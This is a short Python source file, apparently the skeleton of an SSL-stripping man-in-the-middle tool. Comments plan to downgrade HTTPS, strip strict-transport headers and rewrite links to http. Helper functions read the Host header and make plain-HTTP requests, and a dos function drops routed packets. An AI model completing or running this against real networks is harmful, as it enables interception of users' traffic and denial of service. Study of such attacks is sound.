from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap, sendp, send
from scapy.layers.http import *
from netfilterqueue import NetfilterQueue
import socket
import re

from networking import *
from export import *

# Receive all of the packets from the client

# send own https request to the server
# The request IP should be from the AITM

# Receive the packets from the server

# Manipulate the server https response
# Strip strict-transfer-protocol
# Replace https links with http

'''
------------------------
SSL STRIP METHODS
------------------------
'''

# Input: A Decoded Scapy Packet Payload
def get_host(payload):
    payload_lines = payload.splitlines()
    
    host = None

    for line in payload_lines:
        if line.lower().startswith("host:"):
            host = line.split(":")[1].strip()
            break
    
    return host

# Input: Destination IP & optionally also the port
def make_http_request(destination: str):
    client = HTTP_Client()
    resp = client.request("http://" + destination)
    client.close()

    return resp

'''
---------------------
SSL STRIP MAIN METHOD
---------------------
'''

# Input: Routed packet
# Description: Deny service by dropping packets on route
def dos(pkt):
    print("Packet dropped: ", pkt)
    pkt.drop()
